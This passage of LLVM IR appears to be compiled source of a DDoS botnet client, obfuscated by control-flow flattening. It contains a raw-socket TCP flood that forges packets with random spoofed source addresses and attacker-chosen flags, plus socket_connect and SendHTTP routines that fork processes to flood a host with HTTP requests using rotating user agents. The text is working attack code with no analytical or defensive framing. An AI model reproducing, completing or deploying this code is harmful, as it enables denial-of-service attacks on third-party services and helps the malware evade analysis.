  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 8, i32 4, i1 false)
  %50 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %50, i32* %17, align 4
  %51 = load i32, i32* %17, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 -859512026, i32 -382373405
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 317780319, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  %56 = load i32, i32* %17, align 4
  %57 = bitcast i32* %18 to i8*
  %58 = call i32 @setsockopt(i32 %56, i32 0, i32 3, i8* %57, i32 4) #5
  %59 = icmp slt i32 %58, 0
  %60 = select i1 %59, i32 1811868115, i32 1964335124
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 317780319, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %14, align 4
  %64 = icmp eq i32 %63, 0
  %65 = select i1 %64, i32 1663143231, i32 -107141627
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 0, i32* %19, align 4
  store i32 1105458652, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %14, align 4
  %69 = sub nsw i32 32, %68
  %70 = shl i32 1, %69
  %71 = sub nsw i32 %70, 1
  %72 = xor i32 %71, -1
  store i32 %72, i32* %19, align 4
  store i32 1105458652, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %12, align 4
  %75 = sext i32 %74 to i64
  %76 = add i64 40, %75
  store i64 %76, i64* %.reg2mem2
  %77 = call i8* @llvm.stacksave()
  store i8* %77, i8** %20, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %78 = alloca i8, i64 %.reload4, align 16
  store i8* %78, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %79 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %79, %struct.iphdr** %21, align 8
  %80 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %81 = bitcast %struct.iphdr* %80 to i8*
  %82 = getelementptr i8, i8* %81, i64 20
  %83 = bitcast i8* %82 to %struct.tcphdr*
  store %struct.tcphdr* %83, %struct.tcphdr** %22, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %86 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = load i32, i32* %19, align 4
  %89 = call i32 @getRandomIP(i32 %88)
  %90 = call i32 @htonl(i32 %89) #10
  %91 = load i32, i32* %12, align 4
  %92 = sext i32 %91 to i64
  %93 = add i64 20, %92
  %94 = trunc i64 %93 to i32
  call void @makeIPPacket(%struct.iphdr* %84, i32 %87, i32 %90, i8 zeroext 6, i32 %94)
  %95 = call i32 @rand_cmwc()
  %96 = trunc i32 %95 to i16
  %97 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %98 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %97, i32 0, i32 0
  %99 = bitcast %union.anon* %98 to %struct.anon.0*
  %100 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %99, i32 0, i32 0
  store i16 %96, i16* %100, align 4
  %101 = call i32 @rand_cmwc()
  %102 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon* %103 to %struct.anon.0*
  %105 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %104, i32 0, i32 2
  store i32 %101, i32* %105, align 4
  %106 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon* %107 to %struct.anon.0*
  %109 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %108, i32 0, i32 3
  store i32 0, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon* %111 to %struct.anon.0*
  %113 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %112, i32 0, i32 4
  %114 = load i16, i16* %113, align 4
  %115 = and i16 %114, -241
  %116 = or i16 %115, 80
  store i16 %116, i16* %113, align 4
  %117 = load i8*, i8** %11, align 8
  %118 = call i32 @strcmp(i8* %117, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.501, i32 0, i32 0)) #9
  %119 = icmp ne i32 %118, 0
  %120 = select i1 %119, i32 -2114056162, i32 1559235537
  store i32 %120, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %123 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon* %123 to %struct.anon.0*
  %125 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %124, i32 0, i32 4
  %126 = load i16, i16* %125, align 4
  %127 = and i16 %126, -513
  %128 = or i16 %127, 512
  store i16 %128, i16* %125, align 4
  %129 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %130 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %129, i32 0, i32 0
  %131 = bitcast %union.anon* %130 to %struct.anon.0*
  %132 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %131, i32 0, i32 4
  %133 = load i16, i16* %132, align 4
  %134 = and i16 %133, -1025
  %135 = or i16 %134, 1024
  store i16 %135, i16* %132, align 4
  %136 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %136, i32 0, i32 0
  %138 = bitcast %union.anon* %137 to %struct.anon.0*
  %139 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %138, i32 0, i32 4
  %140 = load i16, i16* %139, align 4
  %141 = and i16 %140, -257
  %142 = or i16 %141, 256
  store i16 %142, i16* %139, align 4
  %143 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %144 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %143, i32 0, i32 0
  %145 = bitcast %union.anon* %144 to %struct.anon.0*
  %146 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %145, i32 0, i32 4
  %147 = load i16, i16* %146, align 4
  %148 = and i16 %147, -4097
  %149 = or i16 %148, 4096
  store i16 %149, i16* %146, align 4
  %150 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %151 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %150, i32 0, i32 0
  %152 = bitcast %union.anon* %151 to %struct.anon.0*
  %153 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %152, i32 0, i32 4
  %154 = load i16, i16* %153, align 4
  %155 = and i16 %154, -2049
  %156 = or i16 %155, 2048
  store i16 %156, i16* %153, align 4
  store i32 -1109995376, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i8*, i8** %11, align 8
  %159 = call i8* @strtok(i8* %158, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.502, i32 0, i32 0)) #5
  store i8* %159, i8** %23, align 8
  store i32 -803377934, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = load i8*, i8** %23, align 8
  %162 = icmp ne i8* %161, null
  %163 = select i1 %162, i32 322517608, i32 110084448
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8*, i8** %23, align 8
  %166 = call i32 @strcmp(i8* %165, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.503, i32 0, i32 0)) #9
  %167 = icmp ne i32 %166, 0
  %168 = select i1 %167, i32 780983825, i32 -518111839
  store i32 %168, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %171 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %170, i32 0, i32 0
  %172 = bitcast %union.anon* %171 to %struct.anon.0*
  %173 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %172, i32 0, i32 4
  %174 = load i16, i16* %173, align 4
  %175 = and i16 %174, -513
  %176 = or i16 %175, 512
  store i16 %176, i16* %173, align 4
  store i32 1959619876, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i8*, i8** %23, align 8
  %179 = call i32 @strcmp(i8* %178, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.504, i32 0, i32 0)) #9
  %180 = icmp ne i32 %179, 0
  %181 = select i1 %180, i32 984539167, i32 -2049934336
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %184 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %183, i32 0, i32 0
  %185 = bitcast %union.anon* %184 to %struct.anon.0*
  %186 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %185, i32 0, i32 4
  %187 = load i16, i16* %186, align 4
  %188 = and i16 %187, -1025
  %189 = or i16 %188, 1024
  store i16 %189, i16* %186, align 4
  store i32 -936171713, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i8*, i8** %23, align 8
  %192 = call i32 @strcmp(i8* %191, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.505, i32 0, i32 0)) #9
  %193 = icmp ne i32 %192, 0
  %194 = select i1 %193, i32 2144296867, i32 619827421
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 0
  %198 = bitcast %union.anon* %197 to %struct.anon.0*
  %199 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %198, i32 0, i32 4
  %200 = load i16, i16* %199, align 4
  %201 = and i16 %200, -257
  %202 = or i16 %201, 256
  store i16 %202, i16* %199, align 4
  store i32 -2047529911, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load i8*, i8** %23, align 8
  %205 = call i32 @strcmp(i8* %204, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.506, i32 0, i32 0)) #9
  %206 = icmp ne i32 %205, 0
  %207 = select i1 %206, i32 -2082942706, i32 164461692
  store i32 %207, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 0
  %211 = bitcast %union.anon* %210 to %struct.anon.0*
  %212 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %211, i32 0, i32 4
  %213 = load i16, i16* %212, align 4
  %214 = and i16 %213, -4097
  %215 = or i16 %214, 4096
  store i16 %215, i16* %212, align 4
  store i32 850071506, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i8*, i8** %23, align 8
  %218 = call i32 @strcmp(i8* %217, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.507, i32 0, i32 0)) #9
  %219 = icmp ne i32 %218, 0
  %220 = select i1 %219, i32 -83318809, i32 -602310720
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 0
  %224 = bitcast %union.anon* %223 to %struct.anon.0*
  %225 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %224, i32 0, i32 4
  %226 = load i16, i16* %225, align 4
  %227 = and i16 %226, -2049
  %228 = or i16 %227, 2048
  store i16 %228, i16* %225, align 4
  store i32 1822860045, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  store i32 1822860045, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  store i32 850071506, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  store i32 -2047529911, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  store i32 -936171713, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  store i32 1959619876, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %235, i8** %23, align 8
  store i32 -803377934, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  store i32 -1109995376, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = call i32 @rand_cmwc()
  %239 = trunc i32 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  %242 = bitcast %union.anon* %241 to %struct.anon.0*
  %243 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %242, i32 0, i32 5
  store i16 %239, i16* %243, align 2
  %244 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 0
  %246 = bitcast %union.anon* %245 to %struct.anon.0*
  %247 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %246, i32 0, i32 6
  store i16 0, i16* %247, align 4
  %248 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 0
  %250 = bitcast %union.anon* %249 to %struct.anon.0*
  %251 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %250, i32 0, i32 7
  store i16 0, i16* %251, align 2
  %252 = load i32, i32* %9, align 4
  %253 = icmp eq i32 %252, 0
  %254 = select i1 %253, i32 1754046856, i32 51425805
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = call i32 @rand_cmwc()
  store i32 1992089816, i32* %switchVar
  store i32 %256, i32* %.reg2mem10
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i32, i32* %9, align 4
  %259 = trunc i32 %258 to i16
  %260 = call zeroext i16 @htons(i16 zeroext %259) #10
  %261 = zext i16 %260 to i32
  store i32 1992089816, i32* %switchVar
  store i32 %261, i32* %.reg2mem10
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %263 = trunc i32 %.reload11 to i16
  %264 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 0
  %266 = bitcast %union.anon* %265 to %struct.anon.0*
  %267 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %266, i32 0, i32 1
  store i16 %263, i16* %267, align 2
  %268 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %269 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %270 = call zeroext i16 @tcpcsum(%struct.iphdr* %268, %struct.tcphdr* %269)
  %271 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 0
  %273 = bitcast %union.anon* %272 to %struct.anon.0*
  %274 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %273, i32 0, i32 6
  store i16 %270, i16* %274, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %275 = bitcast i8* %.reload8 to i16*
  %276 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 2
  %278 = load i16, i16* %277, align 2
  %279 = zext i16 %278 to i32
  %280 = call zeroext i16 @csum(i16* %275, i32 %279)
  %281 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 7
  store i16 %280, i16* %282, align 2
  %283 = call i64 @time(i64* null) #5
  %284 = load i32, i32* %10, align 4
  %285 = sext i32 %284 to i64
  %286 = add nsw i64 %283, %285
  %287 = trunc i64 %286 to i32
  store i32 %287, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 1529131023, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  store i32 -1043320563, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i32, i32* %17, align 4
  %291 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %292 = call i64 @sendto(i32 %290, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %291, i32 16)
  %293 = load i32, i32* %19, align 4
  %294 = call i32 @getRandomIP(i32 %293)
  %295 = call i32 @htonl(i32 %294) #10
  %296 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 8
  store i32 %295, i32* %297, align 4
  %298 = call i32 @rand_cmwc()
  %299 = trunc i32 %298 to i16
  %300 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 3
  store i16 %299, i16* %301, align 4
  %302 = call i32 @rand_cmwc()
  %303 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %304 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %303, i32 0, i32 0
  %305 = bitcast %union.anon* %304 to %struct.anon.0*
  %306 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %305, i32 0, i32 2
  store i32 %302, i32* %306, align 4
  %307 = call i32 @rand_cmwc()
  %308 = trunc i32 %307 to i16
  %309 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %310 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %309, i32 0, i32 0
  %311 = bitcast %union.anon* %310 to %struct.anon.0*
  %312 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %311, i32 0, i32 0
  store i16 %308, i16* %312, align 4
  %313 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %314 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %313, i32 0, i32 0
  %315 = bitcast %union.anon* %314 to %struct.anon.0*
  %316 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %315, i32 0, i32 6
  store i16 0, i16* %316, align 4
  %317 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %318 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %319 = call zeroext i16 @tcpcsum(%struct.iphdr* %317, %struct.tcphdr* %318)
  %320 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %321 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %320, i32 0, i32 0
  %322 = bitcast %union.anon* %321 to %struct.anon.0*
  %323 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %322, i32 0, i32 6
  store i16 %319, i16* %323, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %324 = bitcast i8* %.reload6 to i16*
  %325 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %326 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %325, i32 0, i32 2
  %327 = load i16, i16* %326, align 2
  %328 = zext i16 %327 to i32
  %329 = call zeroext i16 @csum(i16* %324, i32 %328)
  %330 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 7
  store i16 %329, i16* %331, align 2
  %332 = load i32, i32* %25, align 4
  %333 = load i32, i32* %15, align 4
  %334 = icmp eq i32 %332, %333
  %335 = select i1 %334, i32 1658275054, i32 -439647142
  store i32 %335, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  %337 = call i64 @time(i64* null) #5
  %338 = load i32, i32* %24, align 4
  %339 = sext i32 %338 to i64
  %340 = icmp sgt i64 %337, %339
  %341 = select i1 %340, i32 -953361955, i32 1662020316
  store i32 %341, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  store i32 -1797005785, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i32 1529131023, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i32, i32* %25, align 4
  %346 = add i32 %345, 1
  store i32 %346, i32* %25, align 4
  store i32 1529131023, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %348)
  store i32 317780319, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %347, %344, %343, %342, %336, %289, %288, %262, %257, %255, %237, %236, %234, %233, %232, %231, %230, %229, %221, %216, %208, %203, %195, %190, %182, %177, %169, %164, %160, %157, %121, %73, %67, %66, %62, %61, %55, %54, %47, %46, %40, %35, %31, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %.reg2mem = alloca %struct.hostent*
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %.reg2mem
  %.reload2 = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  store %struct.hostent* %.reload2, %struct.hostent** %6, align 8
  %switchVar = alloca i32
  store i32 -1890170725, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1890170725, label %first
    i32 2042461516, label %14
    i32 -722791451, label %15
    i32 -749187676, label %38
    i32 -1031126234, label %39
    i32 1804162840, label %45
    i32 1681333212, label %46
    i32 691210977, label %48
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  %12 = icmp eq %struct.hostent* %.reload, null
  %13 = select i1 %12, i32 2042461516, i32 -722791451
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 691210977, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load %struct.hostent*, %struct.hostent** %6, align 8
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %16, i32 0, i32 4
  %18 = load i8**, i8*** %17, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %22 = bitcast %struct.in_addr* %21 to i8*
  %23 = load %struct.hostent*, %struct.hostent** %6, align 8
  %24 = getelementptr inbounds %struct.hostent, %struct.hostent* %23, i32 0, i32 3
  %25 = load i32, i32* %24, align 4
  %26 = sext i32 %25 to i64
  call void @bcopy(i8* %20, i8* %22, i64 %26) #5
  %27 = load i16, i16* %5, align 2
  %28 = call zeroext i16 @htons(i16 zeroext %27) #10
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %31, i32* %9, align 4
  %32 = load i32, i32* %9, align 4
  %33 = bitcast i32* %8 to i8*
  %34 = call i32 @setsockopt(i32 %32, i32 6, i32 1, i8* %33, i32 4) #5
  %35 = load i32, i32* %9, align 4
  %36 = icmp eq i32 %35, -1
  %37 = select i1 %36, i32 -749187676, i32 -1031126234
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 691210977, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %9, align 4
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  %43 = icmp eq i32 %42, -1
  %44 = select i1 %43, i32 1804162840, i32 1681333212
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 691210977, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %9, align 4
  store i32 %47, i32* %3, align 4
  store i32 691210977, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %3, align 4
  ret i32 %49

loopEnd:                                          ; preds = %46, %45, %39, %38, %15, %14, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #5
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  %switchVar = alloca i32
  store i32 -349809508, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -349809508, label %24
    i32 1499670688, label %29
    i32 1460161807, label %43
    i32 748483737, label %44
    i32 513824631, label %50
    i32 1259516213, label %57
    i32 104573419, label %68
    i32 -1088174105, label %69
    i32 -625885408, label %70
    i32 -313678812, label %71
    i32 1437148342, label %74
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %14, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  %28 = select i1 %27, i32 1499670688, i32 1437148342
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %31 = load i8*, i8** %7, align 8
  %32 = load i8*, i8** %10, align 8
  %33 = load i8*, i8** %8, align 8
  %34 = call i32 @rand() #5
  %35 = srem i32 %34, 59
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %36
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 (i8*, i8*, ...) @sprintf(i8* %30, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.509, i32 0, i32 0), i8* %31, i8* %32, i8* %33, i8* %38) #5
  %40 = call i32 @fork() #5
  %41 = icmp ne i32 %40, 0
  %42 = select i1 %41, i32 1460161807, i32 -625885408
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 748483737, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %15, align 4
  %46 = sext i32 %45 to i64
  %47 = call i64 @time(i64* null) #5
  %48 = icmp sgt i64 %46, %47
  %49 = select i1 %48, i32 513824631, i32 -1088174105
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %8, align 8
  %52 = load i16, i16* %9, align 2
  %53 = call i32 @socket_connect(i8* %51, i16 zeroext %52)
  store i32 %53, i32* %13, align 4
  %54 = load i32, i32* %13, align 4
  %55 = icmp ne i32 %54, 0
